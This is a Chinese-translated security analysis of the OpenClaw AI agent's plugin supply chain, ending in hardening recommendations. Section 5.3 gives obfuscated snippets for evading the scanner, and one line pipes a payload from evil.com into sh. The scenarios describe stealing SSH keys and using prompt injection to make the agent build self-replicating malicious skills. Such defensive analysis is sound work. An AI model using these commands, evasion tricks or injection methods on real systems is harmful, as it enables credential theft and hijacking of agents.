> 本文为中文翻译版本。英文原版为权威版本，如有差异以英文版为准。
> [English Version](../07-plugin-supply-chain.md)

# 第三阶段：插件供应链安全分析

## OpenClaw 安全研究——插件与技能系统

---

## 1. 执行摘要

OpenClaw 的插件系统是整个应用中**最大的单一攻击面**。拥有超过 275KB 的插件基础设施代码、75KB 的插件 SDK 以及随核心产品一起发布的 48 个内置技能，插件生态系统代表了一个深度集成的扩展机制，**在进程内运行且无沙箱隔离**。

关键发现是架构性的：插件以与宿主应用相同的权限级别执行。插件 SDK 明确提供了运行 Shell 命令（`run-command.ts`）、访问文件系统（`json-store.ts`、`file-lock.ts`、`temp-path.ts`）、执行带认证的网络请求（`fetch-auth.ts`）以及挂钩到代理生命周期每个阶段的能力。结合基于 npm 的分发和社区市场（ClawHub），这创建了一个供应链攻击面 (Supply Chain Attack Surface)，其中一个恶意或被攻陷的插件就可以实现完整的系统入侵。

现有的安全扫描器（`skill-scanner.ts`）仅提供基于正则表达式的 JS/TS 文件静态分析，完全跳过 `node_modules`，扫描上限为 500 个文件，且无法检测混淆、运行时生成或依赖链攻击。它是一个减速带，而非屏障。

**总体风险评级：严重**

---

## 2. 插件架构

### 2.1 安装流程

插件遵循基于 npm 的分发模型：

```
Discovery (discovery.ts, 17KB)
    |
    v
Registry Lookup (registry.ts, 14KB / http-registry.ts)
    |
    v
Manifest Validation (manifest.ts, 5KB + manifest-registry.ts, 8KB)
    |
    v
npm Install (install.ts, 15KB)
    |
    v
Security Scan (skill-scanner.ts — static regex only)
    |
    v
Plugin Loading (loader.ts, 22KB)
    |
    v
Hook Registration (hooks.ts, 23KB)
    |
    v
Tool Registration (tools.ts, 4KB)
    |
    v
IN-PROCESS EXECUTION (no sandbox, no isolation)
```

关键架构文件及其角色：

| 文件 | 大小 | 角色 |
|------|------|------|
| `loader.ts` | 22KB | 将插件代码加载到宿主进程 |
| `install.ts` | 15KB | 管理基于 npm 的插件安装 |
| `discovery.ts` | 17KB | 从注册表和 ClawHub 发现插件 |
| `registry.ts` | 14KB | 本地插件注册表管理 |
| `hooks.ts` | 23KB | 生命周期钩子注册和分发 |
| `manifest.ts` / `manifest-registry.ts` | 13KB | 插件清单解析和验证 |
| `types.ts` | 21KB | 插件系统类型定义 |
| `update.ts` | 13KB | 插件更新机制 |
| `config-state.ts` | 7KB | 插件配置状态管理 |
| `path-safety.ts` | 0.8KB | 路径遍历保护（最小化）|

### 2.2 执行模型

插件在主 OpenClaw 应用**进程内运行**。这一点被多个在沙箱模型下不可能实现的 SDK 能力所证实：

- 通过 `json-store.ts`、`file-lock.ts`、`temp-path.ts`、`config-paths.ts` 直接访问文件系统
- 通过 `run-command.ts` 执行 Shell 命令
- 通过 `fetch-auth.ts` 执行带认证的 HTTP 请求
- 通过 `hooks.ts` 直接挂钩到代理消息处理

没有进程隔离、没有基于能力的安全模型、没有 seccomp/AppArmor/namespace 限制，也没有对插件执行施加资源限制。

### 2.3 插件插槽 (Plugin Slots)

`slots.ts` (3KB) 系统定义了命名的扩展点。值得注意的是，**内存是一个特殊插槽**——这意味着插件可以完全替换或拦截代理的内存系统。这允许恶意插件：

- 读取所有代理记忆和对话历史
- 修改记忆以影响未来的代理行为
- 从内存存储中外泄积累的个人数据

---

## 3. 插件能力

插件 SDK（`src/plugin-sdk/`，约 75KB）授予插件一系列广泛的能力：

### 3.1 系统访问

| 能力 | SDK 文件 | 风险级别 |
|------|----------|----------|
| 运行任意 Shell 命令 | `run-command.ts` (1.1KB) | **严重** |
| 读写持久化 JSON 数据 | `json-store.ts` | 高 |
| 文件锁定（意味着文件 I/O）| `file-lock.ts` (4.5KB) | 高 |
| 临时文件创建 | `temp-path.ts` | 中 |
| 配置文件访问 | `config-paths.ts` | 高 |

### 3.2 网络访问

| 能力 | SDK 文件 | 风险级别 |
|------|----------|----------|
| 带认证的 HTTP 请求 | `fetch-auth.ts` (2KB) | **严重** |
| Webhook 端点（入站）| `webhook-path.ts`、`webhook-targets.ts` | 高 |
| SSRF "保护"（仅为建议性）| `ssrf-policy.ts` (2.4KB) | 低（缓解措施）|

### 3.3 代理集成

| 能力 | SDK 文件 | 风险级别 |
|------|----------|----------|
| 工具注册（新代理工具）| `tool-send.ts` | 高 |
| 生命周期钩子 (Lifecycle Hooks)（8+ 种钩子类型）| 通过 `hooks.ts` | **严重** |
| 回复载荷操纵 | `reply-payload.ts` | 高 |
| 文本处理/分块 | `text-chunking.ts` | 低 |
| 去重逻辑 | `persistent-dedupe.ts` | 低 |

### 3.4 认证与访问控制

| 能力 | SDK 文件 | 风险级别 |
|------|----------|----------|
| 命令授权 | `command-auth.ts` (2.8KB) | 高 |
| 访问控制列表 (ACL) | `allow-from.ts` | 中 |
| 群组访问管理 | `group-access.ts` | 中 |
| 配对访问（设备配对）| `pairing-access.ts` | 高 |

### 3.5 外部服务集成

| 能力 | SDK 文件 | 风险级别 |
|------|----------|----------|
| Slack 消息操作 | `slack-message-actions.ts` | 中 |
| 插件引导流程 | `onboarding.ts` | 低 |
| 状态报告 | `status-helpers.ts` | 低 |

### 3.6 能力总结

一个插件可以访问：Shell、文件系统、网络（带认证令牌）、所有代理消息、代理记忆、设备配对和 Webhook 基础设施。这在功能上等同于**以用户权限进行的完全本地代码执行**。

---

## 4. 供应链攻击面

### 4.1 npm 分发

插件以 npm 包形式分发。这继承了 npm 的所有供应链风险：

- **依赖混淆 (Dependency Confusion)**：攻击者在公共 npm 注册表上发布与私有/内部插件同名的包。
- **拼写抢注 (Typosquatting)**：名称与流行 OpenClaw 插件相似的包（例如 `openclaw-slack` vs `openclaw-slak`）。
- **维护者账户被攻陷**：一个流行插件的 npm 账户被攻陷，即可获取所有更新用户的访问权限。
- **传递依赖 (Transitive Dependencies)**：插件的依赖项（及其依赖项）不会被安全扫描器扫描，因为扫描器跳过 `node_modules`。
- **安装后脚本 (Post-install Scripts)**：npm 包可在 `npm install` 期间通过 `postinstall` 脚本执行任意代码——这在任何安全扫描之前运行。

### 4.2 ClawHub 市场

ClawHub 是一个社区市场，任何人都可以发布插件。这产生了典型的市场信任问题：

- **无代码审查要求**：插件无需安全审查即可发布。
- **邻近信任 (Trust by Proximity)**：用户可能认为 ClawHub 插件经过审查，因为它们出现在官方市场中。
- **声誉操纵 (Reputation Gaming)**：新账户可以发布带有伪造下载量或评论的恶意插件。
- **更新攻击 (Update Attack)**：合法插件在建立信任后可以推送恶意更新。
- **名称抢注 (Name Squatting)**：注册暗示官方身份的插件名称（例如 "openclaw-security-patch"）。

### 4.3 skill-creator 技能

OpenClaw 附带一个名为 `skill-creator` 的内置技能，可以**以编程方式创建新技能**。这是攻击的力量倍增器：

- 恶意插件可以使用 `skill-creator` 生成额外的恶意技能。
- LLM 提示注入攻击可以指示代理创建包含恶意代码的技能。
- 创建的技能继承所有插件 SDK 能力，包括 Shell 访问。
- 这实际上在 OpenClaw 生态系统中创造了自我复制恶意代码的潜力。

### 4.4 依赖链深度

48 个内置技能，每个可能引入数十个 npm 依赖项，传递依赖面是巨大的。保守估计：

```
48 个技能 x 约 20 个直接依赖 x 约 5 个传递依赖 = 约 4,800 个包
```

这 4,800+ 个包中的任何一个都可能被攻陷。安全扫描器不检查其中任何一个。

---

## 5. 安全扫描器局限性

技能扫描器（`skill-scanner.ts`）来自第二阶段，提供了插件唯一的自动化安全门控。其局限性非常严重：

### 5.1 检测能力

扫描器检查以下内容：
- `child_process` 使用
- `eval()` 调用
- 加密挖矿模式
- 环境变量获取结合网络访问
- 混淆代码模式
- 可疑的 WebSocket 使用
- 数据外泄模式

### 5.2 根本局限性

| 局限性 | 影响 |
|--------|------|
| **仅基于正则的静态分析** | 无法检测运行时代码生成、`Function()` 构造函数调用或 `import()` 表达式 |
| **仅扫描 JS/TS 文件** | 遗漏原生插件 (.node)、WebAssembly (.wasm)、Shell 脚本、Python 脚本或任何非 JS 载荷 |
| **完全跳过 node_modules** | 所有传递依赖对扫描器不可见 |
| **500 文件上限** | 依赖树较大的插件可能超过此限制，导致文件未被扫描 |
| **无行为分析** | 无法检测由组合看似无害操作而产生的恶意行为 |
| **无数据流分析** | 无法追踪数据从敏感源到网络输出的流向 |
| **无签名验证** | 不验证插件代码是否与签名清单匹配 |
| **安装后运行** | npm `postinstall` 脚本在扫描器运行之前执行 |

### 5.3 绕过技术

以下技术可以绕过扫描器：

```javascript
// 1. 动态导入（不会被 child_process 的正则捕获）
const mod = await import('child' + '_process');

// 2. 字符编码构造
const fn = String.fromCharCode(101,118,97,108); // "eval"
globalThis[fn]('malicious code');

// 3. Buffer 混淆
const cmd = Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString();

// 4. 基于依赖的攻击（扫描器跳过 node_modules）
// package.json: { "dependencies": { "totally-legit-utils": "^1.0.0" } }
// totally-legit-utils 包含恶意代码

// 5. WebAssembly 载荷（扫描器只检查 JS/TS）
const wasmModule = await WebAssembly.instantiate(wasmBuffer);
wasmModule.instance.exports.exfiltrate();

// 6. 延迟执行（无运行时监控）
setTimeout(() => { /* 恶意代码 */ }, 86400000); // 24 小时后

// 7. 滥用插件 SDK（run-command.ts 是合法 API）
import { runCommand } from '@openclaw/plugin-sdk';
await runCommand('curl https://evil.com/payload | sh');
```

技术 7 特别值得注意：插件 SDK 自身的 `run-command.ts` 是用于 Shell 执行的**合法 API**。使用它运行任意命令的插件是在行使设计好的能力，而非利用漏洞。扫描器没有理由标记此行为。

---

## 6. 内置技能风险分析

48 个内置技能中，有几个因其交互系统的敏感性而需要特别关注：

### 6.1 严重风险技能

#### 1password
- **访问**：密码库、凭据、密钥、TOTP 码
- **风险**：被攻陷的 1password 技能可以访问用户的整个凭据存储。密码库内容外泄将是灾难性的。
- **攻击向量**：通过 `after-tool-call` 生命周期钩子挂钩到 1password 技能的工具调用，静默复制获取的凭据。

#### coding-agent
- **访问**：源代码、开发环境、可能的 CI/CD 密钥
- **风险**：可以读写任意源代码，可能在用户项目中注入后门。
- **攻击向量**：在"编程辅助"过程中修改源代码以引入微妙的漏洞。

#### camsnap（摄像头）
- **访问**：设备摄像头
- **风险**：未授权的图像捕获，对用户环境的视觉监控。
- **攻击向量**：在常规操作期间触发摄像头捕获并外泄图像。

#### openhue（智能家居）
- **访问**：Philips Hue 智能照明，可能还有其他智能家居设备
- **风险**：物理安全影响——攻击者可以确定居住模式、禁用安全照明或协调物理入侵时机。
- **攻击向量**：监控灯光状态变化以构建居住模型；在物理入侵期间关闭灯光。

### 6.2 高风险技能

| 技能 | 访问 | 主要风险 |
|------|------|----------|
| `slack` | 工作区消息、文件、频道 | 企业数据外泄 |
| `discord` | 服务器消息、私信、语音频道 | 社会工程、数据窃取 |
| `github` / `gh-issues` | 仓库、议题、PR、密钥 | 源代码窃取、供应链攻击 |
| `notion` | 文档、数据库、工作区 | 知识产权窃取 |
| `obsidian` | 个人知识库 | 个人数据外泄 |
| `apple-notes` / `bear-notes` | 个人笔记 | 个人数据外泄 |
| `apple-reminders` / `things-mac` | 日程、任务 | 行为画像 (Behavioral Profiling) |
| `imsg` / `bluebubbles` / `wacli` | iMessage、WhatsApp 消息 | 通信拦截 |
| `himalaya` | 邮件 | 邮件访问、钓鱼 |
| `spotify-player` / `sonoscli` | 音频设备 | 音频监控潜力 |
| `voice-call` | 语音通信 | 语音拦截 |
| `trello` | 项目管理数据 | 商业情报窃取 |

### 6.3 消息技能作为特别关注点

OpenClaw 附带**四个**消息相关技能：`imsg`、`bluebubbles`、`wacli` 和 `slack`。通过生命周期钩子挂钩到这些技能的恶意插件可以：

1. 跨平台读取所有收发消息
2. 冒充用户发送消息
3. 将消息历史外泄到外部服务器
4. 通过 `message` 生命周期钩子修改传输中的消息

### 6.4 `oracle` 和 `sag` 技能

这些技能（名称暗示咨询/分析功能）可能因其分析能力而拥有广泛的数据访问权限。如果没有精确的作用域限定，它们代表了环境权限 (Ambient Authority) 风险。

---

## 7. 插件生命周期钩子作为攻击面

钩子系统（`hooks.ts`，23KB）是插件架构中最强大——也是最危险的部分之一。插件可以在八个或更多生命周期点注册钩子：

### 7.1 钩子类型和攻击潜力

| 钩子 | 触发条件 | 攻击潜力 |
|------|----------|----------|
| `before-agent-start` | 代理初始化 | 修改代理配置、注入系统提示、更改模型选择 |
| `after-tool-call` | 任何工具执行后 | 拦截工具结果、窃取其他技能返回的数据（如来自 1password 的密码）、修改结果 |
| `message` | 每条消息处理时 | 读取所有用户/代理消息、修改传输中的消息、注入隐藏指令 |
| `session` | 会话生命周期事件 | 跟踪用户会话、跨重启持久化、建立 C2 通道 |
| `subagent` | 子代理创建 | 拦截或修改子代理行为、注入到委派的任务中 |
| `compaction` | 记忆压缩 (Memory Compaction) | 在整合期间访问和修改代理记忆、注入虚假记忆 |
| `gateway` | 网关/API 请求 | 中间人攻击 API 调用、拦截认证令牌 |
| `llm` | LLM API 调用 | 读取/修改发送给 LLM 的提示、拦截响应、提示注入 |

### 7.2 钩子链攻击

由于多个插件可以在同一生命周期点注册钩子，攻击者可以利用钩子顺序：

1. **插件 A**（合法）：通过工具调用从 1password 获取密码。
2. **插件 B**（恶意）：注册了一个 `after-tool-call` 钩子，在插件 A 的工具返回后触发。插件 B 从工具结果中读取密码并将其外泄。

`message` 钩子特别危险，因为它在**每条消息**上触发，为恶意插件提供了所有用户-代理通信的持续流。

### 7.3 `llm` 钩子：提示注入倍增器

`llm` 钩子允许插件在提示发送到语言模型之前拦截和修改提示。这使得以下攻击成为可能：

- **持久化提示注入**：静默地将指令附加到每次 LLM 调用
- **模型行为修改**：更改系统提示以改变代理个性或绕过安全防护
- **响应操纵**：在用户看到之前修改 LLM 响应
- **通过提示外泄数据**：将窃取的数据编码到发送给攻击者控制的 LLM 端点的提示中

---

## 8. 风险矩阵

### 8.1 威胁可能性 vs. 影响

| 威胁 | 可能性 | 影响 | 总体风险 |
|------|--------|------|----------|
| 恶意 ClawHub 插件 | 高 | 严重 | **严重** |
| npm 依赖被攻陷 | 中 | 严重 | **严重** |
| 合法插件变为恶意（更新攻击）| 中 | 严重 | **高** |
| 已安装插件的生命周期钩子滥用 | 高 | 高 | **高** |
| 通过提示注入利用 skill-creator | 中 | 高 | **高** |
| 内置技能被攻陷（供应链）| 低 | 严重 | **高** |
| 复杂攻击者绕过扫描器 | 高 | 高 | **高** |
| 通过钩子的跨插件数据窃取 | 高 | 高 | **高** |
| 内存插槽替换 | 中 | 严重 | **高** |
| postinstall 脚本攻击 | 中 | 严重 | **高** |
| 原生插件 / WASM 载荷（未扫描）| 低 | 严重 | **中** |

### 8.2 插件系统的 STRIDE 分析

| 类别 | 威胁 | 状态 |
|------|------|------|
| **欺骗 (Spoofing)** | 插件冒充另一个插件或核心组件 | 无缓解措施（无代码签名）|
| **篡改 (Tampering)** | 插件通过钩子修改代理行为 | 无缓解措施（钩子拥有完全访问权限）|
| **抵赖 (Repudiation)** | 恶意插件操作不可追溯 | 无插件操作审计日志 |
| **信息泄露 (Information Disclosure)** | 插件读取其他插件工具调用的数据 | 无缓解措施（共享进程空间）|
| **拒绝服务 (Denial of Service)** | 插件消耗无限资源 | 无资源限制 |
| **权限提升 (Elevation of Privilege)** | 插件访问超出声明范围的能力 | 无能力限制（SDK 授予全部权限）|

---

## 9. 攻击场景

### 场景 1：特洛伊生产力插件

**向量**：ClawHub 市场
**难度**：低
**影响**：完整系统入侵

1. 攻击者在 ClawHub 上发布 "openclaw-super-summarizer"——一个总结网页的插件。
2. 该插件合法地使用 `fetch-auth.ts` 进行网络请求，使用 `text-chunking.ts` 进行处理。
3. 安全扫描器未发现任何可疑之处——插件仅使用经批准的 SDK API。
4. 安装后，插件注册一个 `message` 钩子。
5. 通过 `message` 钩子，它使用合法的 `fetch-auth.ts` 能力静默地将所有用户-代理对话外泄到外部端点。
6. 使用 `run-command.ts`，它定期运行 `cat ~/.ssh/id_rsa` 并外泄 SSH 密钥。

**扫描器为何遗漏**：该插件仅使用官方 SDK API。没有 `child_process` 导入，没有 `eval()`，没有混淆代码。扫描器没有"数据从消息钩子流向网络请求"的概念。

### 场景 2：凭据收割器

**向量**：生命周期钩子滥用
**难度**：低
**影响**：完整凭据被攻陷

1. 一个看似无害的插件（如天气仪表盘）注册一个 `after-tool-call` 钩子。
2. 该钩子检查所有插件的每个工具调用结果。
3. 当 1password 技能返回凭据时，钩子捕获它们。
4. 当 github 技能返回 API 令牌时，钩子捕获它们。
5. 当 slack 技能返回 OAuth 令牌时，钩子捕获它们。
6. 捕获的凭据被写入 `json-store.ts`（持久存储）并通过 Webhook 定期外泄。

**此攻击奏效的原因**：`after-tool-call` 钩子接收所有工具调用的结果，而不仅仅是注册插件自身的调用。钩子数据没有访问控制。

### 场景 3：自我复制的技能

**向量**：skill-creator + 提示注入
**难度**：中
**影响**：持久化入侵

1. 攻击者向用户发送精心构造的消息（如通过邮件或聊天链接），其中包含提示注入载荷。
2. 代理处理消息后，受注入影响，调用 `skill-creator` 技能。
3. `skill-creator` 生成一个嵌入恶意代码的新技能。
4. 新技能注册钩子并开始如场景 1 或 2 般运作。
5. 即使原始提示注入被发现并删除触发消息，创建的技能仍然存在。
6. 创建的技能可以自行调用 `skill-creator` 生成额外的恶意技能作为备份持久化机制。

### 场景 4：依赖链攻击

**向量**：npm 传递依赖
**难度**：中
**影响**：扫描前代码执行

1. 攻击者识别一个被流行 OpenClaw 插件作为传递依赖使用的低下载量 npm 包。
2. 攻击者攻陷包维护者的 npm 账户（或购买被放弃的包名称）。
3. 攻击者发布一个带有 `postinstall` 脚本的新版本，该脚本在 `npm install` 期间执行。
4. 当 OpenClaw 插件被安装或更新时，恶意的 `postinstall` 运行。
5. 代码在安全扫描器运行**之前**执行（扫描器在安装后运作）。
6. 扫描器也不会检测到它——因为它跳过 `node_modules`。

### 场景 5：智能家居跟踪者

**向量**：openhue 技能 + 生命周期钩子
**难度**：低
**影响**：物理安全被攻陷

1. 恶意插件注册 openhue 技能工具调用的钩子。
2. 通过监控灯光开/关模式，插件构建用户住宅的居住模型。
3. 插件外泄此数据："晚上 11 点关灯，早上 7 点开灯。每周二 6-9 点不在家。"
4. 结合来自 apple-reminders（日历/日程）和消息技能（旅行计划）的数据，攻击者构建完整的行为画像。
5. 此信息被出售或用于在已知无人时段规划物理入侵。

---

## 10. 建议

### 10.1 严重优先级（立即实施）

#### R1：插件沙箱化
将插件隔离在具有受限能力的独立进程中。选项包括：
- **Node.js Worker Threads**（受限 `workerData`）（最小可行方案）
- **独立 Node.js 进程**（通过 IPC 通信）（更好的隔离）
- **V8 隔离区 (Isolates)**（通过 `isolated-vm`）（强隔离，保持性能）
- **容器化执行**（通过轻量级容器）（最强隔离）

每个插件应在其清单中声明所需的能力，沙箱中仅提供这些能力。

#### R2：基于能力的权限模型 (Capability-Based Permission Model)
用显式能力声明替代当前的"全有或全无" SDK 访问：

```yaml
# 清单能力声明示例
capabilities:
  network:
    - domain: "api.weather.com"
      methods: ["GET"]
  filesystem:
    - path: "$PLUGIN_DATA_DIR"
      access: "read-write"
  hooks:
    - "message"  # 仅请求的钩子
  commands: false  # 无 Shell 访问
  camera: false
  credentials: false
```

应在安装时提示用户批准能力，类似于移动应用权限模型。

#### R3：钩子数据隔离
`after-tool-call` 钩子**不应**接收其他插件工具调用的数据。每个插件的钩子应仅看到其自身工具调用的数据。`message` 钩子应需要用户明确同意，并在激活时显示持续指示器。

#### R4：消除扫描前代码执行
- 在插件安装期间阻止 npm `postinstall` 脚本（使用 `--ignore-scripts`）
- 在任何代码执行**之前**对下载的包运行安全扫描
- 扫描 `node_modules` 内容，而不仅仅是顶层插件代码

### 10.2 高优先级

#### R5：增强安全扫描器
- 实现基于 AST 的分析替代正则（使用 `@babel/parser` 或 `ts-morph`）
- 添加数据流分析以检测源到汇模式（凭据访问到网络）
- 扫描所有文件类型，而不仅仅是 JS/TS（检查 .node、.wasm、.sh、.py 文件）
- 移除 500 文件上限或使其可配置并带有警告
- 添加超越字符串匹配的行为签名

#### R6：插件代码签名
- 要求插件包的加密签名
- 在安装前和每次加载时验证签名
- 维护被攻陷插件的撤销列表
- ClawHub 应使用自己的密钥对经验证的插件进行二次签名

#### R7：限制 skill-creator
- 在创建任何技能之前要求用户明确确认并进行完整代码审查
- 创建的技能应经过与已安装插件相同的安全扫描
- 对技能创建进行速率限制以防止自动化批量生成
- 将所有 skill-creator 调用记录到审计跟踪中

#### R8：运行时监控
- 为已安装的插件实施运行时行为监控
- 跟踪网络连接、文件访问模式和命令执行
- 在异常行为时发出警报（例如天气插件访问 ~/.ssh）
- 维护所有插件操作的审计日志，用户可访问

### 10.3 中等优先级

#### R9：依赖审计
- 将 `npm audit` 集成到插件安装流程中
- 维护已知被攻陷包的拒绝列表
- 固定传递依赖版本以防止静默更新
- 考虑为 ClawHub 插件使用依赖代理/镜像

#### R10：内置技能加固
- 对 48 个内置技能的每一个应用最小权限原则
- 1password 技能应具有零网络访问——它仅需要本地密码库交互
- camsnap 技能应需要每次调用时的用户确认
- 消息技能应在受限的数据上下文中运行

#### R11：ClawHub 市场安全
- 为所有发布的插件实施强制自动化安全扫描
- 要求插件发布者账户启用双因素认证 (2FA)
- 为新插件添加审核期，在出现在搜索结果之前
- 实施针对插件安全问题的漏洞赏金计划
- 在插件列表上显示安全审计状态和最后扫描日期

#### R12：内存插槽保护
- 未经用户明确同意和显著警告，不允许第三方插件替换内存插槽
- 内存插槽插件应以更高标准进行审计
- 考虑将内存系统设为普通插件架构之外的特权组件

### 10.4 架构考量

根本问题在于 OpenClaw 的插件系统是为最大化开发者便利性和集成深度而设计的，安全性是事后考虑的。`path-safety.ts` 文件只有 0.8KB——是插件目录中最小的文件——这很好地反映了安全投入与功能投入的比例。

纵深防御 (Defense-in-Depth) 方法至关重要：

```
Layer 1: 市场审查（ClawHub 审核）
Layer 2: 静态分析（增强扫描器）
Layer 3: 安装时保护（无 postinstall，依赖审计）
Layer 4: 能力限制（声明的权限）
Layer 5: 运行时隔离（沙箱执行）
Layer 6: 运行时监控（行为分析）
Layer 7: 审计日志（取证能力）
```

目前，仅 Layer 2 以有限形式存在。Layer 1 和 Layer 3-7 均不存在。

---

## 附录 A：文件清单

### 插件基础设施 (`src/plugins/`)

| 文件 | 大小 | 功能 |
|------|------|------|
| `hooks.ts` | 23KB | 生命周期钩子系统 |
| `loader.ts` | 22KB | 插件加载 |
| `types.ts` | 21KB | 类型定义 |
| `discovery.ts` | 17KB | 插件发现 |
| `install.ts` | 15KB | 安装 |
| `registry.ts` | 14KB | 插件注册表 |
| `update.ts` | 13KB | 更新机制 |
| `commands.ts` | 8.5KB | 插件命令 |
| `manifest-registry.ts` | 8KB | 清单注册表 |
| `config-state.ts` | 7KB | 配置状态 |
| `uninstall.ts` | 6KB | 卸载 |
| `manifest.ts` | 5KB | 清单解析 |
| `tools.ts` | 4KB | 工具注册 |
| `slots.ts` | 3KB | 扩展插槽 |
| `services.ts` | 2KB | 服务 |
| `path-safety.ts` | 0.8KB | 路径安全 |
| `http-registry.ts` | — | HTTP 路由 |
| `http-path.ts` | — | HTTP 路径 |
| `bundled-dir.ts` | — | 内置插件目录 |
| `bundled-sources.ts` | — | 内置插件来源 |
| `runtime/` | — | 插件运行时 |

### 插件 SDK (`src/plugin-sdk/`)

| 文件 | 大小 | 功能 |
|------|------|------|
| `index.ts` | 21KB | SDK 主入口 |
| `file-lock.ts` | 4.5KB | 文件锁定 |
| `command-auth.ts` | 2.8KB | 命令授权 |
| `ssrf-policy.ts` | 2.4KB | SSRF 保护 |
| `fetch-auth.ts` | 2KB | 带认证的 Fetch |
| `run-command.ts` | 1.1KB | Shell 命令执行 |
| `json-store.ts` | — | 持久存储 |
| `tool-send.ts` | — | 工具发送 |
| `webhook-path.ts` | — | Webhook 路径 |
| `webhook-targets.ts` | — | Webhook 目标 |
| `allow-from.ts` | — | 访问控制 |
| `group-access.ts` | — | 群组访问 |
| `temp-path.ts` | — | 临时文件 |
| `config-paths.ts` | — | 配置路径 |
| `pairing-access.ts` | — | 设备配对 |
| `slack-message-actions.ts` | — | Slack 集成 |
| `onboarding.ts` | — | 引导流程 |
| `persistent-dedupe.ts` | — | 去重 |
| `reply-payload.ts` | — | 回复载荷 |
| `status-helpers.ts` | — | 状态辅助 |
| `text-chunking.ts` | — | 文本分块 |

### 内置技能（共 48 个）

**凭据/安全**：1password
**开发**：coding-agent、github、gh-issues、clawhub、skill-creator
**通信**：slack、discord、imsg、bluebubbles、wacli、himalaya、voice-call
**生产力**：notion、obsidian、apple-notes、bear-notes、apple-reminders、things-mac、trello、canvas
**媒体**：camsnap、peekaboo、video-frames、openai-image-gen、gifgrep、songsee
**音频/语音**：openai-whisper、openai-whisper-api、sherpa-onnx-tts、spotify-player、sonoscli
**智能家居**：openhue
**AI/LLM**：gemini、oracle、sag、openai-image-gen
**实用工具**：weather、xurl、goplaces、healthcheck、session-logs、model-usage、summarize、blogwatcher
**系统**：tmux、nano-banana-pro、nano-pdf、eightctl、blucli、gog、ordercli、mcporter

---

## 附录 B：与行业标准的比较

| 安全控制 | VS Code 扩展 | Chrome 扩展 | 移动应用 | OpenClaw 插件 |
|----------|-------------|-------------|----------|---------------|
| 沙箱执行 | 部分（扩展宿主）| 是（内容脚本隔离）| 是（应用沙箱）| **否** |
| 声明的权限 | 是（package.json）| 是（manifest.json）| 是（AndroidManifest/Info.plist）| **否** |
| 用户权限提示 | 部分（工作区信任）| 是（安装时）| 是（运行时）| **否** |
| 代码签名 | 是（市场）| 是（CRX 签名）| 是（强制）| **否** |
| 市场审核 | 是（自动 + 人工）| 是（自动 + 人工）| 是（App Store 审核）| **否** |
| 运行时监控 | 有限 | 是（CSP、API 限制）| 是（操作系统级）| **否** |
| 进程隔离 | 是（独立进程）| 是（独立进程）| 是（独立进程）| **否** |
| 能力限制 | 是（API 表面）| 是（权限 API）| 是（权限声明）| **否** |

OpenClaw 的插件系统缺乏行业同行已采用的每一项标准安全控制。这是本分析最重要的发现。

---

*OpenClaw 安全研究第三阶段。分析基于代码结构和 SDK 接口审查。*
